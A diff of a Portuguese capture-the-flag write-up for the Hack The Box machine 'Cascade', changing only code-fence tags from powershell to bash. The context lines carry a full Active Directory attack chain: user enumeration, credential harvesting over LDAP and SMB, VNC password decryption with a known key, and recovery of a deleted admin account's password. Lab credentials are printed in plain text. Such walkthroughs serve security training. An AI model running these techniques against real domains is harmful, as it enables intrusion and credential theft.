@@ -31,7 +31,7 @@
 
 Como em todas as máquinas que fazemos, e como em qualquer trabalho de Pentesting, a primeira fase é a de reconhecimento. Nesta fase, iremos proceder á enumeração das portas, e de outras coisas a seguir. Para enumerar as portas da nossa máquina alvo, irei usar o **nmap**.
 
-```powershell
+```bash
 nmap -p- -n -Pn 10.10.10.182 -sS --min-rate 5000 -oG enumeration/allPorts
 nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 -sC -sV -Pn -oN enumeration/nmap-a.txt
 ```
@@ -83,13 +83,13 @@ O resultado do nmap nos indica que provavelmente estaremos enfrentando um Active
 
 A primeira coisa a analisar é ver se podemos extrair nomes de usuários de domínio via RPCClient. Nesta máquina temos que especificar que queremos entrar com o usuário vazio (-U '') e sem password (-N).
 
-```powershell
+```bash
 rpcclient 10.10.10.182 -N -U ''
 ```
 
 Neste ponto estamos efectivamente no modo interativo, e podemos listar os usuários via **_enumdomusers_**. Para extrair melhor os dados, prefiro executar diretamente os comandos em vez de entrar em modo interativo para poder receber o resultado no meu stdout normal e poder pipear os comandos com outros:
 
-```powershell
+```bash
 rpcclient 10.10.10.182 -N -U '' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > contents/users
 ```
 
@@ -99,7 +99,7 @@ rpcclient 10.10.10.182 -N -U '' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v
 
 Agora que temos usuários de domínio, irei só adicionar usuários admin por defeito e, já que kerberos está aberto, tentar efetuar uma ataque chamado AS-REP Roasting Attack, para tentar recuperar TGT de usuário que foram criados com a opção 'Do not require Kerberos preauthentication' selecionada. Ainda perciso saber o nome do Domain Controller. Então primeiro, vou rodar um crackmapexec, guardar as informações relevantes, e a seguir usar o GetNPUsers.py para tentar recuperar TGTs.
 
-```powershell
+```bash
 crackmapexec smb 10.10.10.182
 #>  SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
 echo -e "10.10.10.182\tcascade.local" >> /etc/hosts
@@ -113,7 +113,7 @@ Nenhum usuário é AS-REP Roastable... Next!
 
 O ldapsearch é uma ferramenta que pode extrair toda a informação de todos os objectos extraíveis por LDAP, que é um protocolo de aplicação para acessar e manter serviços de informações de diretório. É por aí que, por exemplo, uma administrador de domínio cria um novo usuário local de uma máquina onde ele não está... Podemos enumerar os usuários todos, grupos, quem pertence a "x" grupo... É também esse o protocolo pelo qual a ferramenta **_bloodhound-python_**, já usada em outras máquina, extrai toda a informação para gerar o gráfico do bloodhound.
 
-```powershell
+```bash
 ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25 | grep -Ei "userPrincipalName|pass|pwd|cred|secret"
 
 #>  userPrincipalName: CascGuest@cascade.local
@@ -152,7 +152,7 @@ Em primeira instância, a password não funciona... mas o seu formato é típico
 
 Temos credenciais válidas. Agora com essas novas credenciais podemos aceder ao conteúdo partilhado por Samba
 
-```powershell
+```bash
 smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
 
 #>  [+] IP: 10.10.10.182:445        Name: cascade.local
@@ -170,7 +170,7 @@ smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
 
 Podemos ver 4 recursos compartilhados. Vamos dar uma vista de olhos á pasta Data
 
-```powershell
+```bash
 smbclient \\\\10.10.10.182\\Data -U 'r.thompson%rY4n5eva'
 
 #>  Try "help" to get a list of possible commands.
@@ -189,7 +189,7 @@ smbclient \\\\10.10.10.182\\Data -U 'r.thompson%rY4n5eva'
 
 smbclient permite ver os recursos em modo interativo. Vemos que são várias pastas. Como não há muitas coisas, e o conteúdo também não é grande, vou descarregar tudo de uma vez só
 
-```powershell
+```bash
 smb: \> prompt off
 smb: \> recurse on
 mget *
@@ -231,7 +231,7 @@ Na pasta IT/Temp/s.smith, o arquivo VNC contém uma password em hexadecimal.
 
 > "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
 
-```powershell
+```bash
 dos2unix VNC\ Install.reg
 cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F ":" '{print$2}'
 #>  6bcf2a4b6e5aca0f
@@ -241,7 +241,7 @@ echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F ":" '{print$2
 
 Não parece ser a password... e se tentarmos validar com crackmapexec, não corresponde a nenhum usuário. VNC encripta a palavra passe. Mas com uma pequena pesquisa, da para se encontrar na net com desencriptar...
 
-```powershell
+```bash
 echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F ":" '{print$2}') | xxd -ps -r | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
 #>  sT333ve2
 ```
@@ -260,7 +260,7 @@ s.smith tem acesso a mais uma pasta. a pasta Audit$. Vamos ver o que há lá e d
 
 No recurso Audit$ compartilhado a nível de rede, existem binários.exe, dlls e uma base de dados. Podemos ver rapidamente a base de dados com sqlite3
 
-```powershell
+```bash
 sqlite3 Audit.db
 sqlite> .tables
 #>  DeletedUserAudit  Ldap              Misc
@@ -277,7 +277,7 @@ sqlite> select * from Ldap;
 
 ArkSvc está na nossa lista de usuários. O dado encriptado em base64 poderá ser a palavra pass...
 
-```powershell
+```bash
 echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
 #> D|zC;
 ```
@@ -288,7 +288,7 @@ Parece que não está em texto claro!! Mas também não sabemos como foi criptog
 
 O dotPeek é um descompilador de código baseado em .NET. E como sei que esse programa funciona?
 
-```powershell
+```bash
 file CascAudit.exe
 #>  CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
 ```
@@ -331,7 +331,7 @@ Agora é só decifrá-lo. Isto claramente não vou fazer com uma calculadora (de
 
 Sempre verificar a palavra passe com crackmapexec
 
-```powershell
+```bash
 crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
 
 #>  SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
@@ -354,19 +354,19 @@ A ultima fase para escalar privilégios até administrador é a seguinte: Este u
 
 Para reaver todos os objectos removidos, basta uma linha de comando...
 
-```powershell
+```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
 Á resposta deste comando nesta máquina não é muito grande... mas normalmente é enorme. Por isso, recomendo exportar para um ficheiro, fazer o download deste para a nossa maquina, e fazer um grep por "**LegacyPwd e CanonicalName**" ´
 
-```powershell
+```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * > output.txt
 # Pelo evil-winrm, é possível fazer donwload e upload directamente com a ferramenta:
 download "C:/Users/arksvc/Documents/output.txt"
 ```
 
-```powershell
+```bash
 # kali
 cat output.txt | grep -Ei "Legacypwd|canonicalName"
 
@@ -382,7 +382,7 @@ cat output.txt | grep -Ei "Legacypwd|canonicalName"
 
 O último objecto cascade.local/Deleted Objects/TempAdmin tem como password logo abaixo YmFDVDNyMWFOMDBkbGVz (que me parece ser base64 também, mesmo não existing um "=" ou dois "==" no final)
 
-```powershell
+```bash
 echo YmFDVDNyMWFOMDBkbGVz | base64 -d
 #>  baCT3r1aN00dles
 ```
@@ -393,7 +393,7 @@ Esta password era do usuário TempAdmin, mas o ficheiro html nos indicava que es
 
 Está feito! Somos donos da máquina...
 
-```powershell
+```bash
 cmd /c 'dir /r /s root.txt user.txt 2>NUL'
 
 (type C:\Users\Administrator\Desktop\root.txt).SubString(0,15)
